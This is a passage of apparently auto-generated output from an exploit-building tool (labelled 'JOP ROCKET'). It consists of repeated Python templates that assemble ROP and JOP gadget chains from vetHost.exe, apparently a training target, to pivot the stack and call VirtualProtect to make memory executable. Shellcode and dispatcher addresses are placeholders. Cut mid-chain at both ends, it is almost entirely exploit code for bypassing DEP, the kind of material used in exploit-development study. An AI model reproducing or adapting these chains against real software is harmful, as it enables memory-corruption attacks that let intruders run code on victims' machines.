		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EBX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11002a44, # (base + 0x2a44), # pop esi # add byte ptr [eax], al # pop ecx # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ECX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes] 0x74
		# N----> STACK PIVOT TOTAL: 0x74 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ECX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ECX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x54
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x6c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes] 0x7c
		# N----> STACK PIVOT TOTAL: 0x7c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ECX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c6a, # (base + 0x1c6a), # pop edi # pop esi # mov eax, ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call ECX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c5e, # (base + 0x1c5e), # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes] 0x80
		# N----> STACK PIVOT TOTAL: 0x80 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualProtect
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0x11018030) # ptr -> VirtualProtect()
vp_stack += struct.pack('<L', 0x0042DEAD) # return address  <-- where you want it to return
vp_stack += struct.pack('<L', 0x00425000) # lpAddress  <-- Where you want to start modifying proctection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect <-- RWX
vp_stack += struct.pack('<L', 0x00420000) # lpflOldProtect <--  MUST be writable location

shellcode = '\xcc\xcc\xcc\xcc'
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualProtect() JOP chain set up for functional gadgets ending in Jmp/Call EDX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x110153b8, # (base + 0x153b8), # pop edx # ret  # vetHost.exe   Load EDX with address for dispatcher gadget!
